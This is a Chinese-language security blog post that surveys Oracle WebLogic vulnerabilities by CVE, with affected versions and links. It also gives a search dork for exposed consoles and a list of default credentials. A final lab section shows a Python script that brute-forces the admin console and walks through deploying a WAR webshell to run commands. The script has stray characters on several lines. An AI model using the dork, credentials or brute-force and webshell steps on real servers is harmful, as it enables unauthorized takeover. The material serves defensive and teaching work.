**目录**

[Weblogic](#t0)

[Weblogic出现过的漏洞](#t1)

[SSRF(CVE-2014-4210)](#t2)  

[任意文件上传(CVE-2018-2894)](#t3)

[RCE漏洞](#t4)

[CVE-2015-4852](#t5)  

[CVE-2016-0638](#t6)  

[CVE-2016-3510](#t7)   

[CVE-2017-3248](#t8)  

[CVE-2017-3506](#t9)

[Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞（CVE-2017-10271）](#t10)

[Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）](#t11)

[CVE-2018-2893](#t12)  

[CVE-2019-2725](#t13)

[CVE-2019-2729](#t14)

[Weblogic远程代码执行漏洞（CVE-2020-2546）](#t15)

[Weblogic IIOP反序列化漏洞（CVE-2020-2551）](#t16)

[Weblogic远程代码执行漏洞（CVE-2020-14645）](#t17)

[Weblogic Console远程代码执行漏洞(CVE-2020-14882)](#t18)

[CVE-2021-2109 Weblogic Server远程代码执行](#t19)

[Weblogic后台部署war包getshell](#t20)

* * *

![](https://img-blog.csdnimg.cn/20200110143755478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

Weblogic
========

WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVA EE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。

**WebLogic**是Oracle的主要产品之一，是并购BEA得来。是商业市场上主要的Java EE应用服务器软件之一，也是世界上第一个成功商业化的Java EE应用服务器, 已推出到12c(12.2.1.4) 版。而此产品也延伸出WebLogic Portal，WebLogic Integration等企业用的中间件（但当下Oracle主要以Fusion Middleware融合中间件来取代这些WebLogic Server之外的企业包），以及OEPE(Oracle Enterprise Pack for Eclipse)开发工具。

**默认端口**：7001 、7002

**Google关键字**：WebLogic Server Administration Console inurl:console

**常见默认口令：**

*   用户名：system          密码：password
*   用户名：weblogic       密码：weblogic 
*   用户名：admin           密码：security
*   用户名：portadmin     密码：portadmin
*   用户名：joe                密码：password
*   用户名：mary             密码：password
*   用户名：system          密码：security
*   用户名：system          密码：system
*   用户名：wlcsystem      密码：wlcsystem
*   用户名：wlpisystem     密码：wlpisystem
*   用户名：guest             密码：guest

**常见的Weblogic版本**

*   WebLogic Server 14c(14.1.1.0.0)-2020年4月3日
*   WebLogic Server 12c(12.1.1) - 2012年3月6日
*   WebLogic Server 12c(12.0) - 2011年12月1日
*   WebLogic Server 11gR1 PS5 (10.3.6) - 2012年2月23日
*   WebLogic Server 11gR1 PS4 (10.3.5) - 2011年5月6日
*   WebLogic Server 11gR1 PS3 (10.3.4) - 2011年1月15日
*   WebLogic Server 11gR1 PS2 (10.3.3) - 2010年四月
*   WebLogic Server 11gR1 PS1 (10.3.2) - 2009年11月
*   WebLogic Server 11g (10.3.1) - 2009年7月
*   WebLogic Server 10.3 - 2008年8月（J2EE6支持）
*   WebLogic Server 10.0 - 2007年3月（J2EE5支持）
*   WebLogic Server 9.2.4 - 2010年7月22（主要提升管理和运行管理的功能）
*   WebLogic Server 9.1
*   WebLogic Server 9.0 - 【Diablo】 2006年11月
*   WebLogic Server 8.1 －2003年7月发行到2004年8月为成熟版本，也已不再支持
*   WebLogic Server 7.0 －2002年6月发行但是BEA公司推荐放弃使用。
*   WebLogic Server 6.1 - 从November 2006不再支持
*   WebLogic Server 6.0 - 2001年3月,从April 2003不再支持
*   WebLogic Server 5.1 - (代码名: Denali) 第一个支持热部署技术的版本(通过命令行)
*   WebLogic Server 4.0 - 1999年
*   WebLogic Tengah 3.1 - 1998年6月
*   WebLogic Tengah 3.0.1 - 1998年3月
*   WebLogic Tengah 3.0 - 1998年1月
*   WebLogic Tengah - 1997年11月

Weblogic出现过的漏洞
==============

**SSRF**(CVE-2014-4210)  
-------------------------

**漏洞描述**：Oracle融合中间件10.0.2.0和10.3.6.0中Oracle WebLogic Server组件中未指定的漏洞允许远程攻击者通过与WLS-Web服务相关的向量影响机密性。

**影响版本**：10.0.2.0、10.3.6.0

**漏洞标志：**uddiexploer

相关文章：[Weblogic SSRF漏洞(CVE-2014-4210)](https://blog.csdn.net/qq_36119192/article/details/89785985)

**任意文件上传**(CVE-2018-2894)
-------------------------

**漏洞描述**：Oracle融合中间件的Oracle WebLogic Server组件(子组件：WLS-Web服务)中的漏洞。受影响的支持版本是12.1.3.0、12.2.1.2和12.2.1.3。容易攻击的漏洞允许未经身份验证的攻击者通过HTTP进行网络访问，从而危及Oracle WebLogic Server。成功攻击此漏洞可导致接管Oracle WebLogic Server。CVSS3.0基础得分9.8(保密性、完整性和可用性影响)。

**影响版本**：12.1.3.0、12.2.1.2和12.2.1.3

相关文章：[Weblogic 任意文件上传漏洞（CVE-2018-2894）](https://vulhub.org/#/environments/weblogic/CVE-2018-2894/)

**RCE漏洞**
---------

### CVE-2015-4852  

**漏洞描述：**Oracle WebLogic Server 10.3.6.0、12.1.2.0、12.1.3.0和12.2.1.0中的WLS安全组件允许远程攻击者在与oracle\_common/modules/com.bea.core.apache.commons.collections.jar.相关的T3协议流量中通过精心编制的序列化Java对象执行任意命令。注意：此CVE的范围仅限于WebLogicServer产品

**影响版本：**10.3.6.0、12.1.2.0、12.1.3.0和12.2.1.0

### CVE-2016-0638  

**漏洞描述：**Oracle Fusion中间件中的Oracle WebLogic Server组件中未指定的漏洞10.3.6、12.1.2、12.1.3和12.2.1允许远程攻击者通过与Java消息传递服务相关的向量影响机密性、完整性和可用性。

**影响版本：**10.3.6、12.1.2、12.1.3和12.2.1

### CVE-2016-3510   

**漏洞描述：**Oracle Fusion中间件中的Oracle WebLogic Server组件中未指定的漏洞10.3.6.0、12.1.3.0和12.2.1.0允许远程攻击者通过与WLS核心组件相关的向量影响机密性、完整性和可用性，这与CVE-2016-3586不同。

**影响版本：**10.3.6.0、12.1.3.0和12.2.1.0

### CVE-2017-3248  

**漏洞描述：**Oracle融合中间件的Oracle WebLogic Server组件(子组件：核心组件)中的漏洞。受影响的支持版本为10.3.6.0、12.1.3.0、12.2.1.0和12.2.1.1。容易攻击的漏洞允许未经身份验证的攻击者通过T3进行网络访问，从而危及Oracle WebLogic Server。成功攻击此漏洞可导致接管Oracle WebLogic Server。

**影响版本：**10.3.6.0、12.1.3.0、12.2.1.0和12.2.1.1

### CVE-2017-3506

**漏洞描述：**Oracle融合中间件(子组件：Web服务)的Oracle WebLogic Server组件中的漏洞。受影响的支持版本为10.3.6.0、12.1.3.0、12.2.1.0、12.2.1.1和12.2.1.2。难以攻击的漏洞允许未经身份验证的攻击者通过HTTP进行网络访问，从而危及Oracle WebLogic Server。对此漏洞的成功攻击可能导致对关键数据或所有Oracle WebLogic Server可访问数据的未经授权的创建、删除或修改访问，以及对关键数据的未经授权访问或对所有Oracle WebLogic Server可访问数据的完全访问。CVSS3.0基础得分7.4(保密性和完整性影响)。

**影响版本：**10.3.6.0、12.1.3.0、12.2.1.0、12.2.1.1和12.2.1.2

### Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞（CVE-2017-10271）

**漏洞描述：**Oracle融合中间件的Oracle WebLogic Server组件中的漏洞(子组件：WLS安全性)。受影响的支持版本为10.3.6.0.0、12.1.3.0.0、12.2.1.1.0和12.2.1.2.0。容易攻击的漏洞允许未经身份验证的攻击者通过T3进行网络访问，从而危及Oracle WebLogic Server。成功攻击此漏洞可导致接管Oracle WebLogic Server。

**影响版本：**10.3.6.0.0、12.1.3.0.0、12.2.1.1.0和12.2.1.2.0

### Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）

**漏洞描述：**Oracle融合中间件的Oracle WebLogic Server组件(子组件：WLS核心组件)中的漏洞。受影响的支持版本为10.3.6.0、12.1.3.0、12.2.1.2和12.2.1.3。容易攻击的漏洞允许未经身份验证的攻击者通过T3进行网络访问，从而危及Oracle WebLogic Server。成功攻击此漏洞可导致接管Oracle WebLogic Server。

**影响版本：**10.3.6.0、12.1.3.0、12.2.1.2和12.2.1.3

### CVE-2018-2893  

**漏洞描述：**Oracle融合中间件的Oracle WebLogic Server组件(子组件：WLS核心组件)中的漏洞。受影响的支持版本为10.3.6.0、12.1.3.0、12.2.1.2和12.2.1.3。容易攻击的漏洞允许未经身份验证的攻击者通过T3进行网络访问，从而危及Oracle WebLogic Server。成功攻击此漏洞可导致接管Oracle WebLogic Server。

**影响版本：**10.3.6.0、12.1.3.0、12.2.1.2和12.2.1.3

### CVE-2019-2725

**漏洞描述：**Oracle融合中间件(子组件：Web服务)的Oracle WebLogic Server组件中的漏洞。受影响的支持版本是10.3.6.0.0和12.1.3.0.0。容易攻击的漏洞允许未经身份验证的攻击者通过HTTP进行网络访问，从而危及Oracle WebLogic Server。成功攻击此漏洞可导致接管Oracle WebLogic Server。

**影响版本：**10.3.6.0.0和12.1.3.0.0

### CVE-2019-2729

**漏洞描述：**Oracle融合中间件(子组件：Web服务)的Oracle WebLogic Server组件中的漏洞。受影响的支持版本为10.3.6.0.0、12.1.3.0.0和12.2.1.3.0。容易攻击的漏洞允许未经身份验证的攻击者通过HTTP进行网络访问，从而危及Oracle WebLogic Server。成功攻击此漏洞可导致接管Oracle WebLogic Server。CVSS3.0基础得分9.8(保密性、完整性和可用性影响)。

**影响版本：**10.3.6.0.0、12.1.3.0.0和12.2.1.3.0

### Weblogic远程代码执行漏洞（CVE-2020-2546）

**漏洞描述：**该漏洞通过T3协议实现利用、攻击者可通过此漏洞实现远程代码执行，CVSS评分均为9.8。利用复杂度低

**影响版本：**WebLogic Server 10.3.6.0.0 、WebLogic Server 12.1.3.0.0

### Weblogic IIOP反序列化漏洞（CVE-2020-2551）

**漏洞描述：**该漏洞可以绕过Oracle官方在2019年10月份发布的最新安全补丁。攻击者可以通过IIOP协议远程访问Weblogic Server服务器上的远程接口，传入恶意数据，从而获取服务器权限并在未授权情况下远程执行任意代码。IIOP协议以Java接口的形式对远程对象进行访问，默认启用。

**影响版本：** 10.3.6.0.0 、12.1.3.0.0 、12.2.1.3.0 、12.2.1.4.0

相关文章：[Weblogic IIOP反序列化漏洞（CVE-2020-2551） 漏洞分析](https://www.anquanke.com/post/id/197605)

### Weblogic远程代码执行漏洞（CVE-2020-14645）

参考文章：[WebLogic远程代码执行漏洞(CVE-2020-14645)风险通告](https://mp.weixin.qq.com/s/joB5rtKGiSuTtXg0D_I1Gw)

### Weblogic Console远程代码执行漏洞(CVE-2020-14882)

影响版本：

*   Oracle WeblogicServer 10.3.6.0.0
*   Oracle WeblogicServer 12.1.3.0.0
*   Oracle WeblogicServer 12.2.1.3.0
*   Oracle WeblogicServer 12.2.1.4.0
*   Oracle WeblogicServer 14.1.1.0.0

相关文章：[CVE-2020-14882 Weblogic Console远程代码执行漏洞复现](https://xie1997.blog.csdn.net/article/details/113727708)

### CVE-2021-2109 Weblogic Server远程代码执行

影响版本：

*   Weblogic Server 10.3.6.0.0
*   Weblogic Server 12.1.3.0.0
*   Weblogic Server 12.2.1.3.0
*   Weblogic Server 12.2.1.4.0
*   Weblogic Server 14.1.1.0.0

相关文章：[CVE-2021-2109 Weblogic Server远程代码执行复现](https://xie1997.blog.csdn.net/article/details/113704714)

Weblogic后台部署war包getshell
------------------------

访问网站:   [http://192.168.10.129:7001/](http://192.168.10.129:7001/)

![](https://img-blog.csdnimg.cn/20200110145059901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

访问后台登录处，[http://192.168.10.129:7001/console/login/LoginForm.jsp](http://192.168.10.129:7001/console/login/LoginForm.jsp)

![](https://img-blog.csdnimg.cn/20200110145153376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

使用如下脚本爆破

```
import requests       
url = "http://192.168.10.129"      
pwddict = ['WebLogic', 'weblogic', 'Oracle@123', 'password', 'system', 'Administrator', 'admin', 'security', 'joe', 'wlcsystem', 'wlpisystem']      
for user in pwddict:      
    for pwd in pwddict:      
        data = {      
                'j_username':user,      
                'j_password':pwd,      1
                'j_character_encoding':'UTF-8'      1
                }      1
        req = requests.post(url+':7001/console/j_security_check', data=data, allow_redirects=False, verify=False)      1
        if req.status_code == 302 and 'console' in req.text and 'LoginForm.jsp' not in req.text:      1
            print('[+] WebLogic username: '+user+'  password: '+pwd)
```


如下，爆破得到账号密码：WebLogic   Oracle@123

![](https://img-blog.csdnimg.cn/2020011011194047.png)

登录进后台

![](https://img-blog.csdnimg.cn/20200110145023443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

点击部署——>安装

![](https://img-blog.csdnimg.cn/20200110161323881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

点击上传文件  
![](https://img-blog.csdnimg.cn/20200110161400348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

部署本地生成好的 war 包，下一步

![](https://img-blog.csdnimg.cn/20200110162058169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

部署成功

![](https://img-blog.csdnimg.cn/20200110162200520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

下一步

![](https://img-blog.csdnimg.cn/20200110223906470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

下一步

![](https://img-blog.csdnimg.cn/20200110223952531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

完成

![](https://img-blog.csdnimg.cn/20200110224013412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如下，部署成功

![](https://img-blog.csdnimg.cn/20200110224107818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

访问木马执行命令

![](https://img-blog.csdnimg.cn/20200110224155612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

相关文章： [Weblogic漏洞——从入门到放弃](https://www.freebuf.com/column/197339.html)

                   [weblogic漏洞总结](https://www.dazhuanlan.com/2019/09/22/5d877ed471919/)

                   [缝缝补补的WebLogic：绕过的艺术](https://www.freebuf.com/vuls/179579.html)